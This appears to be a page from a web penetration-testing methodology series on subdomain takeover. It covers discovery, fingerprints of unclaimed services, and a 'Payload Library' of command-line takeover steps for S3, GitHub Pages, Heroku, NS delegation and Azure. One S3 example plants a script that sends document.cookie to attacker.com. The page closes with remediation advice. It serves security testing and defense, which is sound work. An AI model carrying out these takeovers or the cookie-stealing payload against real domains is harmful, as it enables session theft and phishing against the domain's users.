---
title: "Subdomain Takeover"
date: 2026-02-24
draft: false
---

# Subdomain Takeover

> **Severity**: High–Critical | **CWE**: CWE-350
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Is Subdomain Takeover?

A subdomain takeover occurs when a DNS record (CNAME, A, NS) points to an external service that no longer exists or is unclaimed. An attacker registers the unclaimed resource and takes control of the subdomain — enabling phishing, cookie theft, and XSS on the parent domain's trust.

```
DNS: shop.target.com  CNAME  target.myshopify.com
Shopify store was deleted → target.myshopify.com is unclaimed
Attacker creates Shopify store at target.myshopify.com
→ shop.target.com now serves attacker-controlled content

Impact:
- SameSite cookie theft (same eTLD+1)
- Subdomain XSS → steals parent domain cookies (if SameSite=Lax/None)
- Phishing under trusted domain
- CORS bypass (if wildcard *.target.com is trusted)
- Bypass CSP (if *.target.com in script-src)
- SPF/DKIM abuse for email phishing
```

---

## Discovery Checklist

- [ ] Enumerate all subdomains (amass, subfinder, assetfinder, dnsx)
- [ ] For each subdomain: check DNS resolution → CNAME chain → ultimate target
- [ ] For CNAME targets: check if service/bucket/page is claimed
- [ ] Look for common "unclaimed" error messages per service (see table below)
- [ ] Check NS delegations — is subdomain NS pointing to attacker-registerable zone?
- [ ] Check A records pointing to cloud IPs that may be released
- [ ] Test S3 buckets, Azure Blob, GitHub Pages, Heroku, Netlify, Vercel, etc.
- [ ] Check expired/deleted infrastructure in CI/CD pipelines
- [ ] Check wildcard DNS responses (*.target.com → may mask subdomain enumeration)

---

## Fingerprint Table — "Unclaimed" Error Messages

| Service | Fingerprint String |
|---------|-------------------|
| GitHub Pages | `There isn't a GitHub Pages site here.` |
| AWS S3 | `NoSuchBucket`, `The specified bucket does not exist` |
| AWS Elastic Beanstalk | `NXDOMAIN` on `.elasticbeanstalk.com` |
| Heroku | `No such app`, `herokussl.com` CNAME dangling |
| Netlify | `Not Found - Request ID` |
| Fastly | `Fastly error: unknown domain` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Tumblr | `There's nothing here.` |
| WordPress.com | `Do you want to register *.wordpress.com?` |
| Surge.sh | `project not found` |
| Azure | `The specified container does not exist` |
| Zendesk | `Oops, this page no longer exists` |
| StatusPage.io | `You are being redirected` |
| UserVoice | `This UserVoice subdomain is currently available` |
| Pantheon | `404 error unknown site!` |
| Ghost | `The thing you were looking for is no longer here` |
| Cargo Collective | `404 Not Found` |
| Fly.io | NXDOMAIN on `.fly.dev` |

---

## Payload Library

### Attack 1 — S3 Bucket Takeover

```bash
# CNAME: static.target.com → target-static.s3.amazonaws.com
# Bucket target-static doesn't exist

# Check if CNAME exists and bucket is unclaimed:
dig CNAME static.target.com
# → target-static.s3.amazonaws.com.

# Check bucket claim status:
curl -s http://target-static.s3.amazonaws.com/ | grep -i "nosuchbucket\|NoSuchBucket"

# Claim the bucket (same region required):
aws s3api create-bucket \
  --bucket target-static \
  --region us-east-1

# Or for other regions:
aws s3api create-bucket \
  --bucket target-static \
  --region eu-west-1 \
  --create-bucket-configuration LocationConstraint=eu-west-1

# Upload XSS PoC:
echo '<html><body><h1>Subdomain Takeover PoC</h1></body></html>' > index.html
aws s3 cp index.html s3://target-static/ --acl public-read
aws s3 website s3://target-static/ --index-document index.html

# Cookie theft payload (if subdomain shares cookies with parent):
echo '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>' > steal.html
aws s3 cp steal.html s3://target-static/cookie-steal.html --acl public-read
```

### Attack 2 — GitHub Pages Takeover

```bash
# CNAME: blog.target.com → target-company.github.io
# GitHub organization/user doesn't have Pages configured for that repo

# Check:
curl -s https://blog.target.com/ | grep -i "github pages"

# Takeover steps:
# 1. Create GitHub account/org with same username as target-company
# 2. Create repository named target-company.github.io
# 3. Enable GitHub Pages on that repo
# 4. Add CNAME file containing: blog.target.com
# 5. Push index.html with PoC

git init takeover-pages
cd takeover-pages
echo "blog.target.com" > CNAME
echo '<html><body>Subdomain Takeover PoC</body></html>' > index.html
git add . && git commit -m "PoC"
git remote add origin https://github.com/target-company/target-company.github.io
git push -u origin main
# Then enable GitHub Pages in repo settings
```

### Attack 3 — Heroku Takeover

```bash
# CNAME: api.target.com → target-api.herokuapp.com
# Heroku app was deleted

# Check:
curl -s https://api.target.com/ | grep -i "no such app\|heroku"

# Takeover:
heroku login
heroku create target-api  # claim the app name
heroku domains:add api.target.com --app target-api
# Deploy minimal app:
echo '{"name": "takeover-poc"}' > package.json
echo 'const http = require("http"); http.createServer((req,res)=>{ res.end("Takeover PoC"); }).listen(process.env.PORT)' > index.js
heroku git:remote -a target-api
git push heroku main
```

### Attack 4 — NS Subdomain Takeover

```bash
# Most impactful: NS delegation for sub.target.com to a registerable zone

# Check NS records:
dig NS internal.target.com
# → ns1.expired-dns-provider.com
# → ns2.expired-dns-provider.com

# If expired-dns-provider.com can be registered:
# 1. Register expired-dns-provider.com
# 2. Set up authoritative DNS
# 3. Create zone for internal.target.com
# 4. Point to attacker-controlled IPs
# → Full control of all *.internal.target.com

# NS takeover gives full DNS control → can create any subdomain
# Can set up: mail.internal.target.com for email phishing
# Can create: login.internal.target.com for credential harvest
```

### Attack 5 — Azure / Cloud Provider Takeover

```bash
# Azure App Service:
# CNAME: app.target.com → target-app.azurewebsites.net
# Azure resource deleted → unclaimed

# Check:
curl -s https://target-app.azurewebsites.net/ | grep -i "azure\|404 web site not found"

# Azure blob storage:
# CNAME: files.target.com → targetfiles.blob.core.windows.net
dig CNAME files.target.com
# Check container:
curl -s https://targetfiles.blob.core.windows.net/ | grep -i "nosuchcontainer\|specified container"

# Claim Azure blob:
az login
az storage account create --name targetfiles --resource-group myRG --location eastus
az storage container create --name '$web' --account-name targetfiles
az storage blob upload --file index.html --container-name '$web' --name index.html \
  --account-name targetfiles --auth-mode key

# Netlify/Vercel takeover:
# CNAME: landing.target.com → target-landing.netlify.app
# Create Netlify site with same name + custom domain
```

---

## Tools

```bash
# Subdomain enumeration:
amass enum -d target.com -o subdomains.txt
subfinder -d target.com -o subdomains.txt
assetfinder target.com | tee subdomains.txt
findomain -t target.com -o subdomains.txt

# CNAME chain resolution:
dnsx -l subdomains.txt -cname -o cnames.txt
massdns -r resolvers.txt -t CNAME subdomains.txt

# Automated takeover detection:
# subjack:
go install github.com/haccer/subjack@latest
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl -c fingerprints.json

# subzy:
go install github.com/LukaSikic/subzy@latest
subzy run --targets subdomains.txt --hide_fails --verify_ssl

# nuclei with takeover templates:
nuclei -l subdomains.txt -t takeovers/ -c 50

# can-i-take-over-xyz (reference list):
# https://github.com/EdOverflow/can-i-take-over-xyz

# Manual CNAME chain check:
while IFS= read -r subdomain; do
  cname=$(dig +short CNAME "$subdomain" | tr -d '.')
  if [ -n "$cname" ]; then
    echo "$subdomain → $cname"
    response=$(curl -sk "https://$subdomain/" | head -5)
    echo "$response"
  fi
done < subdomains.txt

# Check S3 bucket availability:
aws s3api head-bucket --bucket BUCKET_NAME 2>&1 | grep -i "nosuchbucket\|403\|404"
```

---

## Remediation Reference

- **Regular DNS audits**: scan all DNS records quarterly, remove dangling CNAMEs immediately
- **Infrastructure decommission process**: DNS record removal must be part of any service teardown
- **Monitor CNAME targets**: alert when CNAME ultimate target becomes unresolvable or returns error
- **Avoid wildcard CNAME**: `*.target.com → *.cloudprovider.com` is highly dangerous
- **Register defensive resources**: claim common variations of your org name on cloud providers
- **Track external dependencies**: maintain inventory of all external services with DNS entries

*Part of the Web Application Penetration Testing Methodology series.*
